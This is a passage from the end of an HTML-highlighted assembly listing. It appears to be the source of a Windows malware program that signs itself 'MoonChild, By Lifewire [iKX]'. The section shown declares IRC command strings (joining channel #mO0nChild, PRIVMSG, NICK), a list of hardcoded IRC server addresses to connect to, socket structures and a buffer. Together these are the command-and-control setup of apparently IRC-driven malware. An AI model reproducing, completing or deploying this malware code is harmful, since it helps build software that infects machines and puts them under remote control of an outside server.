</span><span class="sc5">channel</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"JOIN #mO0nChild"</span><span class="sc0">

</span><span class="sc5">privmsg</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"PRIVMSG #mO0nChild :"</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.159.0.90",0        ;irc.homelien.no</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.121.6.196",0         ;diemen.undernet</span><span class="sc0">

</span><span class="sc1">;ip              db      "192.160.127.97",0      ;irc.mcs.net</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.154.203.241",0     ;irc.fr</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.67.208.172",0      ;telia.se</span><span class="sc0">

</span><span class="sc1">;ip              db      "127.0.0.1",0</span><span class="sc0">

</span><span class="sc1">;ip              db      "193.49.200.16",0</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.112.4.25",0</span><span class="sc0">

</span><span class="sc1">;ip              db      "195.121.6.196",0</span><span class="sc0">

</span><span class="sc1">;ip              db      "194.119.238.162",0     ;undernet planet inet</span><span class="sc0">

</span><span class="sc5">ip</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"195.159.0.90"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;irc2.homelien.no</span><span class="sc0">

</span><span class="sc5">CMDNick</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"NICK "</span><span class="sc0">

</span><span class="sc5">disconnected</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Disconnected"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc5">rnd32_seed</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">conn_socket</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">WSAData</span><span class="sc0">         </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sockaddrin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sockaddr_in</span><span class="sc0">     </span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sinsize</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sockaddrin</span><span class="sc0">


</span><span class="sc5">buffer</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1005h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0h</span><span class="sc4">)</span><span class="sc0">


</span><span class="sc5">version</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MoonChild, By Lifewire [iKX]"</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">



</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">fill</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">
</span></div></body>
</html>
